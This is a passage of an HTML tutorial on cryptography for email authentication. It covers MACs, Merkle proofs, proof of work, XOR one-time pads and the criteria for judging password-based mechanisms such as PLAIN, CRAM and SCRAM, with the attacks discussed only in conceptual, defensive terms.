        <line x1="350" y1="40.75" x2="350" y2="136.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="348.75" y2="81.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="342"></line>
        <text text-anchor="middle">
            <tspan x="174.375" y="69.5">ClientMessage, hmac(Key, ClientMessage)</tspan>
        </text>
    </g>
    <g>
        <line x1="350" y1="123.5" x2="1.25" y2="123.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="342"></line>
        <text text-anchor="middle">
            <tspan x="175.625" y="111.5">ServerMessage, hmac(Key, ServerMessage)</tspan>
        </text>
    </g>

</svg>

    <figcaption>
A message authentication code is appended to each message.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Merkle_tree"><strong>Proof of inclusion</strong></a>:
When collaborating online,
it’s sometimes useful to be able to prove to others that a
<a href="https://en.wikipedia.org/wiki/Record_(computer_science)">record</a>
has been incorporated into the current state of a system
without having to share or even disclose all the other records.
This can be accomplished by repeatedly hashing two hashes into one
until you’re left with a single hash which captures the state of the whole system.
The resulting structure is called a <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a>.
Records cannot be added to, removed from, or modified in this structure
without affecting the so-called <a href="https://en.wikipedia.org/wiki/Tree_(data_structure)#Terminology">root of the tree</a>.
If someone accepts that a specific root represents the state of the system,
you can prove to this person that a particular record is included in this state
by revealing the hash of the branches with which this record has to be hashed in order to arrive at this root.
This method is interesting for two reasons:
The proof <a href="https://en.wikipedia.org/wiki/Time_complexity#Logarithmic_time">grows logarithmically</a>
with the number of records, which makes it scale very well, and the other records have to be
neither revealed nor transmitted for the verification to succeed.
Such proofs of inclusion are used in <a href="https://en.wikipedia.org/wiki/Bitcoin">Bitcoin</a>
for <a href="https://developer.bitcoin.org/devguide/operating_modes.html#simplified-payment-verification-spv">Simplified Payment Verification (<abbr title="Simplified Payment Verification">SPV</abbr>)</a>,
in <a href="https://en.wikipedia.org/wiki/Trusted_timestamping#Decentralized_timestamping_on_the_blockchain">decentralized timestamping</a>
for document aggregation,
and in <a href="https://transparency.dev/verifiable-data-structures/">Certificate Transparency</a> for auditing.</li>
  </ul>

  <figure>
    <svg id="figure-applications-proof-of-inclusion" data-name="applications-proof-of-inclusion" width="780.961" height="220.5" viewBox="-1.25 -1.25 780.961 220.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="524.501" y1="168.5" x2="562.939" y2="109" marker-end="url(#arrow-blue)" stroke-dasharray="64"></line>
    <line x1="524.501" y1="49.5" x2="562.939" y2="109" marker-end="url(#arrow-green)" stroke-dasharray="64"></line>
    <line x1="258.809" y1="198.25" x2="297.246" y2="168.5" marker-end="url(#arrow)" stroke-dasharray="42"></line>
    <line x1="258.809" y1="138.75" x2="297.246" y2="168.5" marker-end="url(#arrow)" stroke-dasharray="42"></line>
    <line x1="258.809" y1="79.25" x2="297.246" y2="49.5" marker-end="url(#arrow-green)" stroke-dasharray="42"></line>
    <line x1="258.809" y1="19.75" x2="297.246" y2="49.5" marker-end="url(#arrow-blue)" stroke-dasharray="42"></line>
    <line x1="62.061" y1="198.25" x2="100.499" y2="198.25" marker-end="url(#arrow)" stroke-dasharray="31"></line>
    <line x1="62.061" y1="138.75" x2="100.499" y2="138.75" marker-end="url(#arrow)" stroke-dasharray="31"></line>
    <line x1="62.061" y1="79.25" x2="100.499" y2="79.25" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="62.061" y1="19.75" x2="100.499" y2="19.75" marker-end="url(#arrow)" stroke-dasharray="31"></line>
    <rect x="0" y="0" width="61.749" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="30.874" y="25.65"><tspan>Leaf<tspan dy="3">1</tspan><tspan dy="-3">​</tspan></tspan></tspan>
    </text>
    <rect x="0" y="59.5" width="61.749" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="30.874" y="85.15"><tspan>Leaf<tspan dy="3">2</tspan><tspan dy="-3">​</tspan></tspan></tspan>
    </text>
    <rect x="0" y="119" width="61.749" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="30.874" y="144.65"><tspan>Leaf<tspan dy="3">3</tspan><tspan dy="-3">​</tspan></tspan></tspan>
    </text>
    <rect x="0" y="178.5" width="61.749" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="30.874" y="204.15"><tspan>Leaf<tspan dy="3">4</tspan><tspan dy="-3">​</tspan></tspan></tspan>
    </text>
    <rect x="101.749" y="0" width="156.748" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="180.123" y="25.65"><tspan>Node<tspan dy="3">1</tspan><tspan dy="-3">​</tspan></tspan>: hash(Leaf<tspan dy="3">1</tspan><tspan dy="-3">​</tspan>)</tspan>
    </text>
    <rect x="101.749" y="59.5" width="156.748" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="180.123" y="85.15"><tspan>Node<tspan dy="3">2</tspan><tspan dy="-3">​</tspan></tspan>: hash(Leaf<tspan dy="3">2</tspan><tspan dy="-3">​</tspan>)</tspan>
    </text>
    <rect x="101.749" y="119" width="156.748" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="180.123" y="144.65"><tspan>Node<tspan dy="3">3</tspan><tspan dy="-3">​</tspan></tspan>: hash(Leaf<tspan dy="3">3</tspan><tspan dy="-3">​</tspan>)</tspan>
    </text>
    <rect x="101.749" y="178.5" width="156.748" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="180.123" y="204.15"><tspan>Node<tspan dy="3">4</tspan><tspan dy="-3">​</tspan></tspan>: hash(Leaf<tspan dy="3">4</tspan><tspan dy="-3">​</tspan>)</tspan>
    </text>
    <rect x="298.496" y="29.75" width="225.692" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="411.343" y="55.4"><tspan>Node<tspan dy="3">5</tspan><tspan dy="-3">​</tspan></tspan>: hash(Node<tspan dy="3">1</tspan><tspan dy="-3">​</tspan> + Node<tspan dy="3">2</tspan><tspan dy="-3">​</tspan>)</tspan>
    </text>
    <rect x="298.496" y="148.75" width="225.692" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="411.343" y="174.4"><tspan>Node<tspan dy="3">6</tspan><tspan dy="-3">​</tspan></tspan>: hash(Node<tspan dy="3">3</tspan><tspan dy="-3">​</tspan> + Node<tspan dy="3">4</tspan><tspan dy="-3">​</tspan>)</tspan>
    </text>
    <rect x="564.189" y="89.25" width="214.272" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="671.325" y="114.9"><tspan>Root</tspan>: hash(Node<tspan dy="3">5</tspan><tspan dy="-3">​</tspan> + Node<tspan dy="3">6</tspan><tspan dy="-3">​</tspan>)</tspan>
    </text>

</svg>

    <figcaption>
In order to verify that the green leaf is included in the root,
a verifier needs to know only the hashes and the positions of the blue nodes.
</figcaption>
  </figure>

  <ul>
    <li><a href="https://en.wikipedia.org/wiki/Proof_of_work"><strong>Proof of work</strong></a>:
In publicly accessible systems,
you want to discourage participants from using a shared and limited resource beyond their fair share.
One way of doing so is by imposing a cost on using the resource,
which deters anyone who doesn’t value the resource higher than its associated cost.
The resource owner can either charge a fee for using the resource
or require its users to waste a limited resource of their own.
While the former approach is less wasteful,
the latter approach doesn’t require a global infrastructure for
<a href="https://en.wikipedia.org/wiki/Micropayment">micropayments</a>.
For example, your mailbox is a publicly accessible system and your time is a limited resource.
What if you could require every unknown sender to waste one minute of computing power
before they can deliver an email to your inbox?
This would prevent spammers from sending millions of emails a day
– or at least make this antisocial behavior much costlier.
It turns out that there’s a simple way to achieve this:
You could require that the hash of incoming messages falls into a tiny range.
Since one cannot influence the output of a hash function,
senders have to keep appending different nonces to their message
until its hash finally falls into the desired range.
As long as the hash function isn’t broken,
there’s no better way than to keep trying until you’re lucky.
It’s like trying to hit the bull’s eye on a target
when you have zero control over the trajectory of your darts.
While finding an appropriate nonce requires many computations,
the recipient has to hash the message just once
in oder to verify whether the required work has been done.
The average difficulty of the problem can be adjusted by making the target range bigger or smaller.
This technique was invented <a href="https://dl.acm.org/doi/10.5555/646757.705669">in 1992</a>
as a digital <a href="https://en.wikipedia.org/wiki/Postage_stamp">postage stamp</a>
but saw widespread usage only with the rise of
<a href="https://en.wikipedia.org/wiki/Cryptocurrency#Mining">cryptocurrency mining</a>.</li>
  </ul>

  <figure>
    <svg id="figure-applications-proof-of-work" data-name="applications-proof-of-work" width="313.688" height="122.5" viewBox="-174.277 -1.25 313.688 122.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="-89.688" y1="60" x2="-1.25" y2="76" marker-end="url(#arrow-red)" stroke-dasharray="83"></line>
    <line x1="-89.688" y1="60" x2="-1.25" y2="12" marker-end="url(#arrow-red)" stroke-dasharray="94"></line>
    <line x1="-89.688" y1="60" x2="-1.25" y2="44" marker-end="url(#arrow-red)" stroke-dasharray="83"></line>
    <line x1="-89.688" y1="60" x2="-1.25" y2="108" marker-end="url(#arrow-green)" stroke-dasharray="94"></line>
    <rect x="-173.027" y="40.25" width="83.027" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-131.513" y="65.9"><tspan>Content</tspan></tspan>
    </text>
    <line x1="0" y1="0" x2="0" y2="96"></line>
    <line x1="0" y1="96" x2="0" y2="120"></line>
    <line x1="-5" y1="0" x2="5" y2="0"></line>
    <line x1="-5" y1="120" x2="5" y2="120"></line>
    <text text-anchor="start">
        <tspan x="12" y="49.9">hash(Content + 1)</tspan>
    </text>
    <text text-anchor="start">
        <tspan x="12" y="17.9">hash(Content + 2)</tspan>
    </text>
    <text text-anchor="start">
        <tspan x="12" y="81.9">hash(Content + 3)</tspan>
    </text>
    <text text-anchor="start">
        <tspan x="12" y="113.9">hash(Content + X)</tspan>
    </text>

</svg>

    <figcaption>
Finding a nonce which makes the hash of the content fall into a certain range requires many attempts.
</figcaption>
  </figure>

</details>

<details>
  <summary id="exclusive-or-operation-for-perfect-encryption">
Exclusive-or operation for perfect encryption
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Exclusive_or">Exclusive or</a> is a binary
<a href="https://en.wikipedia.org/wiki/Truth_function">truth function</a>,
which means that it combines two inputs into a single output,
where all values are either <a href="https://en.wikipedia.org/wiki/Truth_value">true or false</a>.
Exclusive or returns true if one of the inputs is true but not both.
Instead of true and false, we will use the symbols 1 and 0.
The operator is often written as a plus in a circle
because it corresponds to <a href="https://en.wikipedia.org/wiki/Binary_number#Addition">binary addition</a>
without the <a href="https://en.wikipedia.org/wiki/Carry_(arithmetic)">carry</a>.
Functions which map a finite combination of inputs to some output
can be specified simply by listing all possible mappings in a table:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>A</th>
          <th>⊕</th>
          <th>B</th>
          <th> = </th>
          <th>C</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>0</td>
          <td> </td>
          <td>0</td>
          <td> </td>
          <td>0</td>
        </tr>
        <tr>
          <td>0</td>
          <td> </td>
          <td>1</td>
          <td> </td>
          <td>1</td>
        </tr>
        <tr>
          <td>1</td>
          <td> </td>
          <td>0</td>
          <td> </td>
          <td>1</td>
        </tr>
        <tr>
          <td>1</td>
          <td> </td>
          <td>1</td>
          <td> </td>
          <td>0</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

The <a href="https://en.wikipedia.org/wiki/Truth_table">truth table</a> of the exclusive-or operation.
The output is 1 <a href="https://en.wikipedia.org/wiki/If_and_only_if">if and only if</a> the two inputs are unequal.

</figcaption>
  </figure>

  <p>Since the above table is exhaustive, you can convince yourself that the following properties hold
simply by <a href="https://en.wikipedia.org/wiki/Proof_by_exhaustion">studying all cases</a>:</p>
  <ul>
    <li><strong>Commutativity</strong>: The order of the inputs doesn’t matter: A ⊕ B = B ⊕ A.</li>
    <li><strong>Reversibility</strong>: Applying ⊕ to the output and one of the inputs
gives you the other input: C ⊕ B = A and C ⊕ A = B.</li>
    <li><strong>Entropy-preservation</strong>: If one of the inputs has
a 50% probability of being 0 and a 50% probability of being 1,
then the output also has a 50% probability of being 0 and a 50% probability of being 1,
independent of whether the other input is 0 or 1:
A ⊕ (50%: 0, 50%: 1) = (50%: 0, 50%: 1).
In other words, if one of the inputs is truly random, then so is the output.
In <a href="https://en.wikipedia.org/wiki/Information_theory">information theory</a>,
the amount of information in a <a href="https://en.wikipedia.org/wiki/Random_variable">random variable</a>
is called <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">entropy</a>.
As long as two random variables are statistically
<a href="https://en.wikipedia.org/wiki/Independence_(probability_theory)">independent</a>
from one another, combining them with exclusive or can only increase the entropy but
<a href="https://crypto.stackexchange.com/questions/48145/xor-a-set-of-random-numbers">never decrease it</a>.</li>
  </ul>

  <p>Instead of applying a binary function on binary inputs to two single <a href="https://evalapply.org/internet/#number-encoding">bits</a>,
we can also apply it to two equally long <a href="https://en.wikipedia.org/wiki/Bit_array">strings of bits</a>
by combining the bits at each position separately.
Every such function has a <a href="https://en.wikipedia.org/wiki/Bitwise_operation">bitwise equivalent</a>,
which is usually denoted with the same or a similar symbol.
For example, 0011 ⊕ 0101 = 0110, which corresponds to the columns in the above table.</p>

  <p><a href="https://en.wikipedia.org/wiki/Encryption">Encryption</a> enables two parties
to transfer confidential information over an insecure channel.
In examples, the parties are typically called <a href="https://en.wikipedia.org/wiki/Alice_and_Bob">Alice and Bob</a>,
while the <a href="https://en.wikipedia.org/wiki/Eavesdropping">eavesdropper</a>,
who tries to listen in on their conversation, is usually called
<a href="https://en.wikipedia.org/wiki/Alice_and_Bob#Cast_of_characters">Eve</a>.
The unencrypted message is called <a href="https://en.wikipedia.org/wiki/Plaintext">plaintext</a>,
the encrypted message is called <a href="https://en.wikipedia.org/wiki/Ciphertext">ciphertext</a>.
In <a href="https://en.wikipedia.org/wiki/Symmetric-key_cryptography">symmetric-key cryptography</a>,
Alice and Bob use the same piece of information,
which is known as a <a href="https://en.wikipedia.org/wiki/Key_(cryptography)">cryptographic key</a>,
to encrypt and decrypt the message.
According to <a href="https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle">Kerckhoffs’s principle</a>,
the two algorithms should be designed such that the encryption scheme is secure even if the enemy knows them.
It’s considered bad practice to achieve
<a href="https://en.wikipedia.org/wiki/Security_through_obscurity">security through obscurity</a>.
The following graphic depicts all these terms:</p>

  <figure>
    <svg id="figure-encryption-decryption" data-name="encryption-decryption" width="547.86" height="126" viewBox="-1.25 -87.25 547.86 126" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <text text-anchor="middle">
        <tspan x="381.02" y="-74.5">Key</tspan>
    </text>
    <line x1="381.02" y1="-60.5" x2="381.02" y2="-21" marker-end="url(#arrow-green)" stroke-dasharray="33"></line>
    <text text-anchor="middle">
        <tspan x="164.34" y="-74.5">Key</tspan>
    </text>
    <line x1="164.34" y1="-60.5" x2="164.34" y2="-21" marker-end="url(#arrow-green)" stroke-dasharray="33"></line>
    <line x1="434.609" y1="0" x2="545.36" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="104"></line>
    <text text-anchor="middle">
        <tspan x="489.985" y="-12">Plaintext</tspan>
    </text>
    <line x1="216.992" y1="0" x2="327.43" y2="0" marker-end="url(#arrow-red)" stroke-dasharray="103"></line>
    <text text-anchor="middle">
        <tspan x="272.68" y="-12">Ciphertext</tspan>
    </text>
    <line x1="0" y1="0" x2="110.751" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="104"></line>
    <text text-anchor="middle">
        <tspan x="55.375" y="-12">Plaintext</tspan>
    </text>
    <rect x="112.001" y="-19.75" width="104.679" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="164.34" y="5.9"><tspan>Encryption</tspan></tspan>
    </text>
    <rect x="328.68" y="-19.75" width="104.679" height="39.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="381.02" y="5.9"><tspan>Decryption</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="112.001" y="-47.75"><tspan>Alice</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="433.359" y="-47.75"><tspan>Bob</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="272.68" y="35.5"><tspan>Eve</tspan></tspan>
    </text>

</svg>

    <figcaption>
Eve has access to the ciphertext and knows the algorithms in blue,
while the information in green is known only to Alice and Bob.
</figcaption>
  </figure>

  <p>The <a href="https://en.wikipedia.org/wiki/Exclusive_or#Bitwise_operation">bitwise exclusive-or operation</a>
can be used to construct an encryption scheme,
which is known as the <a href="https://en.wikipedia.org/wiki/One-time_pad">one-time pad</a>.
In order to encrypt a message, Alice computes <code>Ciphertext: Plaintext ⊕ Key</code>.
Bob can then decrypt the message by computing <code>Plaintext: Ciphertext ⊕ Key</code>
thanks to the reversibility property of the exclusive-or operation.
According to the entropy-preservation property,
if the key is completely random, then so is the ciphertext.
To put it differently: If every bit of the key has a 50% probability of being 0
and a 50% probability of being 1, the same is true for every bit of the ciphertext,
regardless of what the plaintext looks like.
Since the ciphertext contains no information at all about the plaintext,
the one-time pad is <a href="https://en.wikipedia.org/wiki/Information-theoretic_security">information-theoretically secure</a>,
which means that even an adversary with infinite computing power cannot break the encryption scheme.
Trying all possible keys doesn’t work
because for every possible plaintext there’s a key (<code>Key: Plaintext ⊕ Ciphertext</code>)
which produces the observed ciphertext.
While this encryption scheme is perfectly secure,
it’s rarely used in practice because the key has to be at least as long as the plaintext
and each key may be used to encrypt only a single message; hence the name one-time pad.
Practical encryption schemes derive an infinite sequence of key material from a finite value,
sacrificing perfect security by doing so.
This makes the <a href="https://en.wikipedia.org/wiki/Key_distribution">distribution of keys</a> much easier,
either by sharing them in advance
or by <a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">deriving them</a> when needed.</p>

  <p>The one-time pad encryption scheme is highly <a href="https://en.wikipedia.org/wiki/Malleability_(cryptography)">malleable</a>:
An attacker can truncate the message at an arbitrary position
and <a href="https://en.wikipedia.org/wiki/Bit-flipping_attack">flip bits in the ciphertext</a>
to cause a bit flip at the same position in the plaintext,
which allows the attacker to replace all parts of the plaintext which are known to them.
Such attacks can be prevented by protecting the ciphertext
with a <a href="#applications-of-cryptographic-hash-functions">message authentication code (<abbr title="Message Authentication Code">MAC</abbr>)</a>
and requiring the recipient to validate the <abbr title="Message Authentication Code">MAC</abbr> before decryption.
We’ll revisit this <a href="#modes-of-operation">towards the end of this article</a>.</p>

</details>

<details>
  <summary id="desirable-properties-of-authentication-mechanisms">
Desirable properties of authentication mechanisms
</summary>

  <p>Now that we’ve covered the cryptographic concepts that we will need
(namely <a href="#cryptographic-hash-functions">hash functions</a>,
<a href="#salts-against-pooled-brute-force-attacks">salts</a>,
<a href="#nonces-against-replay-attacks">nonces</a>,
<a href="#applications-of-cryptographic-hash-functions">key derivation functions</a>,
<a href="#applications-of-cryptographic-hash-functions">message authentication codes</a>,
and <a href="#exclusive-or-operation-for-perfect-encryption">exclusive or</a>),
we can turn our attention to password-based authentication mechanisms.
What makes them interesting is that we want to arrive at strong security from relatively weak passwords.</p>

  <p>Unfortunately, I couldn’t find any good literature on desirable properties of password-based authentication mechanisms,
which is why I made up the following criteria myself.
Since this isn’t my area of expertise,
<a href="mailto:contact@ef1p.com">let me know</a> if I missed an important aspect.
(<a href="https://datatracker.ietf.org/doc/html/rfc7616#section-5">Section 5 of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7616</a>
is the best source that I could find, covering security considerations of
<a href="https://en.wikipedia.org/wiki/Digest_access_authentication">Digest Access Authentication</a>.)</p>

  <p>An ideal password-based authentication mechanism is resistant to:</p>
  <ol>
    <li><strong>Database compromise</strong>: An attacker who compromised the server’s authentication
<a href="https://en.wikipedia.org/wiki/Database">database</a> cannot impersonate its users.
For this reason, passwords should never be stored in plaintext.
Given that an attacker who compromised the database no longer has to interact with the server,
there is no limit in the number of passwords they can try every second.
In order to increase resistance against such offline brute-force attacks,
passwords should be individually salted and repeatedly hashed.
While authentication mechanisms usually don’t dictate
how servers have to store the information required to authenticate their users,
their design can prevent the service provider from applying certain techniques such as salting and stretching.</li>
    <li><strong>Replay attacks</strong>: An attacker who intercepts the communication
between the client and the server cannot impersonate the user in self-initiated sessions.
This is accomplished by making the transmitted authentication information valid only in the current session,
which limits the harm that a man-in-the-middle can cause to the current session.
This is especially valuable if the client can demand only a single action per session from the server,
such as submitting a single message to the outgoing mail server per connection.
Unfortunately, this isn’t the case for any of the protocols discussed in this article.
By preventing delayed attacks, resistance to replay attacks is still a desirable property
because it makes attacks much easier to localize.</li>
    <li><strong>Pooled brute-force attacks</strong>: An attacker who compromised the communication channel
of several users cannot generate and test password candidates for several users at once.</li>
    <li><strong>Individual brute-force attacks</strong>: An attacker who compromised a communication channel encounters
  only stretched derivations from the password, which makes brute-force attacks costlier.</li>
    <li><strong>Denial-of-service attacks</strong>: An attacker cannot launch a computational
<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a> against clients.</li>
    <li><strong>Server impersonation</strong>: An attacker cannot impersonate a server towards a client
without relaying the authentication messages to the actual server.
When combined with measures against man-in-the-middle attacks,
this prevents sending sensitive information to an attacker
who just fakes that the authentication was successful without knowing whether this is the case.
For example, a client shouldn’t submit an email to a server
which cannot verify whether the password was correct.</li>
    <li><strong>Wrong server</strong>: The client detects when it’s connected to the wrong server
(see the box on our <a href="#dangerous-reliance-on-tls">dangerous reliance on <abbr title="Transport Layer Security">TLS</abbr></a>).</li>
    <li><strong>Compromised certification authority</strong>:
The client detects when the used certificate doesn’t belong to the actual server.</li>
    <li><strong>Compromised server key</strong>: The client detects when the server is impersonated
even if the same certificate is being used.</li>
    <li><strong>Comparison attacks</strong>: A compromised server cannot learn
whether two different accounts are protected with the same password,
neither when creating an account nor during ordinary authentication.
Such knowledge can be used to infer that the accounts belong to the same person
– or to contact and bribe one user to compromise the password of the other user.</li>
    <li><strong>Wrong server after database compromise</strong>:
There is no risk in connecting to the wrong server
even if the server’s database has been compromised.
This property is desirable because the database compromise might remain undetected.
And even if the data breach is detected,
many users are likely too lazy to change their passwords.
The wrong server might also just be another server where a user uses the same password.
Reusing the same password should be secure even if you don’t trust all service providers.
(The “should” refers to an ideal authentication mechanism,
which is implemented with static code on the client.
Don’t reuse the same password on different websites!
I have a separate box about <a href="#authentication-on-the-web">authentication on the Web</a>.)</li>
    <li><strong>User impersonation after server compromise</strong>:
An attacker who compromised the server cannot impersonate its users.
This means that even if the server was compromised temporarily,
users don’t have to change their password.
Additionally, this property guarantees the user
that the server is resistant to a database compromise.
The database could even be public.</li>
  </ol>

  <p>The goal of defense in depth is to limit the potential harm as much as possible.
Given that you can reset the password of many of your online accounts through your email account,
you don’t want to send one of your most valuable passwords
directly to a potential attacker when checking your inbox.
Let’s look on how the <a href="#user-authentication">three authentication mechanisms</a> perform in this regard:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Resistant to</th>
          <th><a href="#user-authentication"><abbr title="This is not an acronym but simply the name of the plain user authentication mechanism">PLAIN</abbr></a></th>
          <th><a href="#challenge-response-authentication-mechanism"><abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr></a></th>
          <th><a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a></th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>Database compromise</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Replay attacks</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Pooled brute-force attacks</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Individual brute-force attacks</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Denial-of-service attacks</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Server impersonation</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Wrong server</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Compromised certification authority</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Compromised server keys</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Comparison attacks</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>Wrong server after database compromise</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td>User impersonation after server compromise</td>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
      </tbody>
    </table>

    <figcaption>
A comparison between password-based authentication mechanisms.</figcaption>
  </figure>

  <p>Unfortunately, only the <a href="#user-authentication"><abbr title="This is not an acronym but simply the name of the plain user authentication mechanism">PLAIN</abbr></a>
authentication mechanism is widely deployed on mail servers.
Before we discuss how <a href="#challenge-response-authentication-mechanism"><abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr></a>
and <a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a>
do or don’t fulfill the above properties,
let me mention some aspects which are beyond the scope of this analysis:</p>
  <ol>
    <li><strong>Bugs in implementation</strong>:
Even if an authentication mechanism is resistant to an attack in theory,
it can be vulnerable to it in practice because of <a href="https://en.wikipedia.org/wiki/Software_bug">software bugs</a>.
All you can do is to <a href="https://en.wikipedia.org/wiki/Information_security_audit">actively look for them</a>,
<a href="https://en.wikipedia.org/wiki/Bug_bounty_program">encourage their disclosure</a>, and fix them soon.</li>
    <li><strong>Account theft</strong>:
Authentication mechanisms usually don’t specify how users set and change their password.
An attacker who intercepts the daily communication between a client and a server shouldn’t be
able to <a href="https://en.wikipedia.org/wiki/Self-service_password_reset">change the user’s password</a>,
thereby stealing their account.
Since changing the password is even beyond the scope of most protocols,
there isn’t much to say about this here other than that it’s
a problem of <a href="https://en.wikipedia.org/wiki/Authorization">authorization</a>
rather than a problem of <a href="https://en.wikipedia.org/wiki/Authentication">authentication</a>.
According to the <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">principle of least privilege</a>,
the credentials required for changing the password are ideally different
from the ones required for accessing the system.
<a href="https://en.wikipedia.org/wiki/OAuth">OAuth</a> achieves this with
<a href="https://developers.google.com/gmail/api/auth/scopes">restricted scopes</a>.
Some mailbox providers such as <a href="https://support.apple.com/en-us/HT204397">Apple</a>
and <a href="https://support.google.com/accounts/answer/185833">Google</a>
allow users to generate app-specific passwords,
which can be revoked individually and which aren’t enough to change the user’s password.
Given that <code>PLAIN</code> is the dominant authentication mechanism,
app-specific passwords are highly desirable.</li>
    <li><strong>Downgrade attacks</strong>:
If a server supports several authentication mechanisms,
a man-in-the-middle can remove the stronger ones so that
the client is forced to continue with the weakest one.
We discussed measures against <a href="https://en.wikipedia.org/wiki/Downgrade_attack">downgrade attacks</a>
in the context of backward compatibility <a href="#implicit-tls-versus-explicit-tls">earlier</a>.
New services can support only the strongest authentication mechanism,
which eliminates this problem as well.
The weakness here lies not in individual mechanisms but rather in how they are deployed.</li>
    <li><strong>Online attacks</strong>:
If the attacker has to interact repeatedly with one of the legitimate parties,
we speak of an online attack.
Since users should be able to authenticate themselves from a different network,
an attacker can do the same interaction with one guessed password at a time.
Due to the nature of authentication mechanisms,
online attacks are always possible.
However, service providers can make them more difficult by
<a href="https://en.wikipedia.org/wiki/Rate_limiting">limiting the rate</a> at which new passwords can be tried
and by informing the user about failed attempts.
If not implemented carefully, legitimate users can also be affected by rate limiting.</li>
    <li><strong>Server compromise</strong>:
As long as the server is compromised, there’s nothing left to protect by an authentication mechanism.</li>
    <li><strong>Client compromise</strong>:
An authentication mechanism cannot prevent users from entering their password into a compromised client.
The harm can be limited only by using app-specific passwords or OAuth
(see the second point about account theft).</li>
    <li><strong>Compromised certification authority after database compromise</strong>
or <strong>compromised server keys after database compromise</strong>:
What I write here will make more sense once you’ve read the box
on <a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a>.
An attacker who compromised the database succeeds in the mutual authentication towards the client.
Since the relay of messages to the actual server is therefore no longer necessary,
<a href="#tls-channel-bindings">channel binding</a> can no longer prevent these two variants of the
<a href="#dangerous-reliance-on-tls">man-in-the-middle attack</a>.</li>
  </ol>

</details>

<details>
  <summary id="challenge-response-authentication-mechanism">
Challenge-Response Authentication Mechanism (<abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr>)
</summary>

  <p><a href="https://en.wikipedia.org/wiki/CRAM-MD5"><abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr></a> is a very simple authentication mechanism,
in which the client has to respond to the challenge received from the server:</p>

  <figure>
    <svg id="figure-challenge-response-authentication-mechanism" data-name="challenge-response-authentication-mechanism" width="223.68200000000002" height="181.25" viewBox="-36.841 -1.25 223.68200000000002 181.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-35.591" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
